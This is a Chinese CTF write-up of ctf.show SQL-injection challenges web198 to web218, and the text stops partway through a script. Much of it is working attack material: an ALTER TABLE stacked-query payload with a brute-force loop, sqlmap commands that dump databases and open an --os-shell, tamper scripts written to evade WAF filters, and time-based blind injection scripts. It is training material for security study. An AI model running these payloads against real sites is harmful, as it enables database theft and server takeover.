这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下 PYTHON #-- coding:UTF-8 -- # Author:dota_st # Date:2021&#x2F;6&#x2F;15 22:53 # blog: www.wlhhlc.top import requests url &#x3D; &quot;http:&#x2F;&#x2F;e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; payload &#x3D; &#39;0x61646d696e;alter table ctfshow_user change column &#96;pass&#96; &#96;dotast&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;dotast&#96; &#96;id&#96; varchar(255);&#39; data1 &#x3D; &#123; &#39;username&#39;: payload, &#39;password&#39;: &#39;1&#39; &#125; res &#x3D; requests.post(url&#x3D;url, data&#x3D;data1) for i in range(99): data2 &#x3D; &#123; &#39;username&#39;: &quot;0x61646d696e&quot;, &#39;password&#39;: f&#39;&#123;i&#125;&#39; &#125; res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;data2) if &quot;flag&quot; in res2.json()[&#39;msg&#39;]: print(res2.json()[&#39;msg&#39;]) break web199-200web197的payload或者用198写的脚本 web201从这之后的几道题都是sqlmap的使用 Sqlmap常见命令_K&#39;illCode的博客-CSDN博客 [ sqlmap最新版下载](https:&#x2F;&#x2F;ctfshow.lanzoui.com&#x2F;i4wlziac1de) 使用--user-agent 指定agent 使用--referer 绕过referer检查 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 题目上都写了 使用--user-agent 指定agent 使用--referer 绕过referer检查 抓一下包找到查询的api接口 然后referer要为ctf.show python sqlmap.py -u &quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&quot; --dump --batch --no-cast -- --dump 转储数据库表项,查询字段值-session --no-cast 获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast) --dump 转储数据库表项,查询字段值 --batch &#x2F;&#x2F;自动选择选项 --flush-session sqlmap扫描的时候会将缓存的数据记录到output文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加--flush-session选项。 如果是一步一步的查，那payload应该是 sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump web202 使用--data 调整sqlmap的请求方式 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 那估计要使用 --data 指定 sqlmap 以 post 方式提交数据。 payload python sqlmap.py -u &quot;http:&#x2F;&#x2F;0cebe0af-c76a-4335-a5a8-16064c4de582.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session web203 使用--method 调整sqlmap的请求方式 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 提示要用method改变请求方式，这里使用PUT请求，但是要记得加上设置Content-Type头，否则会变成表单提交 python sqlmap.py -u &quot;http:&#x2F;&#x2F;43ff4bac-b773-4dbb-a031-4e7733802d21.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session --method&#x3D;&quot;PUT&quot; 或者 sqlmap.py -u &quot;http:&#x2F;&#x2F;915e3532-dda5-47a4-82f4-b439e1cd6464.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump web204 使用--cookie 提交cookie数据 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; payload 加个cookie就行了 python sqlmap.py -u &quot;http:&#x2F;&#x2F;3231bb16-ffbb-4679-a2ba-6a9687d737e4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;ctfshow&#x3D;64b77e9cb5917892ab53c4a2f6870182; PHPSESSID&#x3D;c2lm2vuriqmg16ilkbh2f9sern&quot; --method&#x3D;&quot;PUT&quot; web205 api调用需要鉴权 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from ctfshow_user where id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 每次查询都会调用一次getToken.php，这应该就是鉴权的过程 sqlmap中 --safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下 --safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数 payload python sqlmap.py -u &quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;9i0d9ub2ad7q4rl94r3pi9vf23&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 web206 sql需要闭合 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; sqlmap会自动给你把语句闭合的，所以可以继续用上一题的payload python sqlmap.py -u &quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 web207 --tamper 的初体验 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; return preg_match(&#39;&#x2F; &#x2F;&#39;, $str); &#125; 过滤了空格 sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下 举例如下tamper脚本： apostrophemask.py 用utf8代替引号 equaltolike.py MSSQL * SQLite中like 代替等号 greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号 space2hash.py 空格替换为#号 随机字符串 以及换行符 space2comment.py 用&#x2F;**&#x2F;代替空格 apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤 space2mssqlblank.py mssql空格替换为其它空符号 base64encode.py 用base64编码 space2mssqlhash.py mssql查询中替换空格 modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释 space2mysqlblank.py mysql中空格替换其它空白符号 between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;） space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） multiplespaces.py 围绕SQL关键字添加多个空格 space2plus.py 用+替换空格 bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代 space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集 sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾 chardoubleencode.py 双url编码(不处理以编码的) unionalltounion.py 替换UNION ALL SELECT UNION SELECT charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码； randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写 unmagicquotes.py 宽字符绕过 GPC addslashes randomcomments.py 用&#x2F;**&#x2F;分割sql关键字 charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码 securesphere.py 追加特制的字符串 versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过 halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释 对于本题，过滤了空格，我们可以使用tamper文件夹下的space2comment.py文件，payload为 python sqlmap.py -u &quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment web208 -tamper 的2体验 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 &#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id); function waf($str)&#123; return preg_match(&#39;&#x2F; &#x2F;&#39;, $str); &#125; select被替换为空白，但是这里只过滤了小写，而sqlmap里用的一般都是大写 python sqlmap.py -u &quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment 看，确实是大写的select 但是这道题是要考tamper脚本的编写 贴下y4师傅的 https://y4er.com/post/sqlmap-tamper/ #!&#x2F;usr&#x2F;bin&#x2F;env python &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; from lib.core.compat import xrange from lib.core.enums import PRIORITY __priority__ &#x3D; PRIORITY.LOW def tamper(payload, **kwargs): payload &#x3D; space2comment(payload) return payload def space2comment(payload): retVal &#x3D; payload if payload: retVal &#x3D; &quot;&quot; quote, doublequote, firstspace &#x3D; False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace &#x3D; True retVal +&#x3D; chr(0x0a) continue elif payload[i] &#x3D;&#x3D; &#39;\\&#39;&#39;: quote &#x3D; not quote elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;: doublequote &#x3D; not doublequote elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote: retVal +&#x3D; chr(0x0a) continue retVal +&#x3D; payload[i] return retVal web209 --tamper 的3体验 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;TODO 未完工 return preg_match(&#39;&#x2F; |\\*|\\&#x3D;&#x2F;&#39;, $str); &#125; 这题需要将空格和*，=替换，自己写一个tamper (还没学会，我是废物www #!&#x2F;usr&#x2F;bin&#x2F;env python &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; from lib.core.compat import xrange from lib.core.enums import PRIORITY __priority__ &#x3D; PRIORITY.LOW def tamper(payload, **kwargs): payload &#x3D; space2comment(payload) return payload def space2comment(payload): retVal &#x3D; payload if payload: retVal &#x3D; &quot;&quot; quote, doublequote, firstspace &#x3D; False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace &#x3D; True retVal +&#x3D; chr(0x0a) continue elif payload[i] &#x3D;&#x3D; &#39;\\&#39;&#39;: quote &#x3D; not quote elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;: doublequote &#x3D; not doublequote elif payload[i] &#x3D;&#x3D; &quot;*&quot;: retVal +&#x3D; chr(0x31) continue elif payload[i] &#x3D;&#x3D; &quot;&#x3D;&quot;: retVal +&#x3D; chr(0x0a)+&#39;like&#39;+chr(0x0a) continue elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote: retVal +&#x3D; chr(0x0a) continue retVal +&#x3D; payload[i] return retVal payload python sqlmap.py -u &quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209 web210 --tamper 的4体验 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对查询字符进行解密 function decode($id)&#123; return strrev(base64_decode(strrev(base64_decode($id)))); &#125; 对内容先base64解码然后逆序再base64解码再逆序 tamper: #!&#x2F;usr&#x2F;bin&#x2F;env python &quot;&quot;&quot; Copyright (c) 2006-2021 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;) See the file &#39;LICENSE&#39; for copying permission &quot;&quot;&quot; from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage import base64 __priority__ &#x3D; PRIORITY.LOW def dependencies(): singleTimeWarnMessage(&quot;别套了别套了&quot;) def tamper(payload, **kwargs): retVal &#x3D; payload if payload: retVal &#x3D; retVal.encode() retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal.decode() return retVal web211多过滤了一个空格 function decode($id)&#123; return strrev(base64_decode(strrev(base64_decode($id)))); &#125; function waf($str)&#123; return preg_match(&#39;&#x2F; &#x2F;&#39;, $str); &#125; tamper from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage import base64 __priority__ &#x3D; PRIORITY.LOW def dependencies(): singleTimeWarnMessage(&quot;别套了别套了&quot;) def tamper(payload, **kwargs): retVal &#x3D; payload retVal &#x3D; retVal.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;) retVal &#x3D; retVal.encode() retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal.decode() return retVal web212&#x2F;&#x2F;对查询字符进行解密 function decode($id)&#123; return strrev(base64_decode(strrev(base64_decode($id)))); &#125; function waf($str)&#123; return preg_match(&#39;&#x2F; |\\*&#x2F;&#39;, $str); &#125; 比上一个又多过滤了一个星号 tamper： from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage import base64 __priority__ &#x3D; PRIORITY.LOW def dependencies(): singleTimeWarnMessage(&quot;别套了别套了&quot;) def tamper(payload, **kwargs): payload &#x3D; bypass(payload) retVal &#x3D; payload retVal &#x3D; retVal.encode() retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal[::-1] retVal &#x3D; base64.b64encode(retVal) retVal &#x3D; retVal.decode() return retVal def bypass(payload): retVal &#x3D; &quot;&quot; for i in range(len(payload)): if payload[i]&#x3D;&#x3D;&quot; &quot;: retVal +&#x3D; chr(0x9) else: retVal +&#x3D; payload[i] return retVal web213这一题flag不在数据库中，因此需要利用–os-shell进行getshell –os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限 在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出 查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;; 返回逻辑 &#x2F;&#x2F;对查询字符进行解密 function decode($id)&#123; return strrev(base64_decode(strrev(base64_decode($id)))); &#125; payload python sqlmap.py -u &quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshowweb213 --os-shell web214时间盲注，跑脚本就行了 懒得写了，抄一下作业 &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; import requests url &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot; result &#x3D; &quot;&quot; i &#x3D; 0 while True: i &#x3D; i + 1 head &#x3D; 32 tail &#x3D; 127 while head &lt; tail: mid &#x3D; (head + tail) &gt;&gt; 1 # 查数据库 # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; # 查列名字-id.flag # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot; # 查数据 payload &#x3D; &quot;select flaga from ctfshow_flagx&quot; data &#x3D; &#123; &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;, &#39;debug&#39;:&#39;0&#39; &#125; try: r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1) tail &#x3D; mid except Exception as e: head &#x3D; mid + 1 if head !&#x3D; 32: result +&#x3D; chr(head) else: break print(result) web215用了单引号，也就是变成字符型注入了，记得闭合就行 &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; import requests url &#x3D; &quot;http:&#x2F;&#x2F;4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show&#x2F;api&#x2F;&quot; result &#x3D; &quot;&quot; i &#x3D; 0 while True: i &#x3D; i + 1 head &#x3D; 32 tail &#x3D; 127 while head &lt; tail: mid &#x3D; (head + tail) &gt;&gt; 1 # 查数据库 # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; # 查列名字-id.flag # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxc&#39;&quot; # 查数据 payload &#x3D; &quot;select flagaa from ctfshow_flagxc&quot; data &#x3D; &#123; &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;&#x3D;&#39;1&quot;, &#39;debug&#39;:&#39;0&#39; &#125; try: r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1) tail &#x3D; mid except Exception as e: head &#x3D; mid + 1 if head !&#x3D; 32: result +&#x3D; chr(head) else: break print(result) web216where id &#x3D; from_base64($id); 查询语句变成了这样 这题不能将base64编码之后的字符串作为payload传入，因为base64解码之后，SQL会当做一个字符串而不是一个语句 尝试闭合这个base64解码 &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; import requests url &#x3D; &quot;http:&#x2F;&#x2F;0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show&#x2F;api&#x2F;&quot; result &#x3D; &quot;&quot; i &#x3D; 0 while True: i &#x3D; i + 1 head &#x3D; 32 tail &#x3D; 127 while head &lt; tail: mid &#x3D; (head + tail) &gt;&gt; 1 # 查数据库 # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; # 查列名字-id.flag # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcc&#39;&quot; # 查数据 payload &#x3D; &quot;select flagaac from ctfshow_flagxcc&quot; data &#x3D; &#123; &#39;ip&#39;: f&quot;&#39;MQ&#x3D;&#x3D;&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;, &#39;debug&#39;:&#39;0&#39; &#125; try: r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1) tail &#x3D; mid except Exception as e: head &#x3D; mid + 1 if head !&#x3D; 32: result +&#x3D; chr(head) else: break print(result) web217查询语句 where id &#x3D; ($id); 返回逻辑 &#x2F;&#x2F;屏蔽危险分子 function waf($str)&#123; return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str); &#125; 过滤了sleep，但是还有一个benchmark函数 MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能套神的测试： 但是这个误差会很大 运行一次md5的时间可太短了，但是benchmark就是运行114514 1145140次md5计算出来的时间 值得注意的是，时间是指客户端的经过时间，不是在服务器端的CPU时间。 因此这个在注入的时候，和服务器跟网速有关 可以借鉴了feng师傅的思路,使用了time.sleep函数使每请求一次延迟0.2秒，提高准确率，且每爆出一个字母后就再延迟1.2秒，以免服务器卡顿，这样每条请求之间间隔一定的时间，虽然爆起来比较慢，但是准确率可以说是100%，不至于受到服务器和网速的影响。 #@Auth：Sentiment import requests import time url&#x3D;&quot;http:&#x2F;&#x2F;f563ebb3-cced-467b-b970-59f54fb5c9a0.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; flag&#x3D;&#39;&#39; for i in range(50): m&#x3D;32 n&#x3D;127 while 1: mid&#x3D;(m+n)&#x2F;&#x2F;2 data&#x3D;&#123; #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow_flagxccb,ctfshow_info #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxccb&#39;),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #id,flagaabc,info &#39;ip&#39;:&quot;if(ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;d0ec2f99-1463-480a-b2d0-f5bb3d464411&#125; &#125; #print(data) try: r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.5) m&#x3D;mid except: n&#x3D;mid if(m+1&#x3D;&#x3D;n): flag+&#x3D;chr(m) print(flag) break time.sleep(0.2) time.sleep(1) web218function waf($str)&#123; return preg_match(&#39;&#x2F;sleep|benchmark&#x2F;i&#39;,$str); &#125; benchmark也被过滤了 参考一下这两个 https://www.cnblogs.com/forforever/p/13019703.html SQL注入有趣姿势总结 - 先知社区 (aliyun.com) 1.sleep 2.benchmark 3.笛卡尔积 4.GET_LOCK() 加锁 5.RLIKE REGEXP正则匹配 使用rpad或者repeat构造长字符串，利用正则表达式控制延时 mysql&gt; select * from ctftable where if((concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1,1); +----+-------+--------+ | id | user | passwd | +----+-------+--------+ | 1 | admin | passwd | | 2 | user | pass | | 3 | Lxxx | 123456 | +----+-------+--------+ 3 rows in set (3.63 sec) import time import requests url &#x3D; &#39;http:&#x2F;&#x2F;3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show&#x2F;api&#x2F;index.php&#39; flag &#x3D; &#39;&#39; sleep_rep &#x3D; 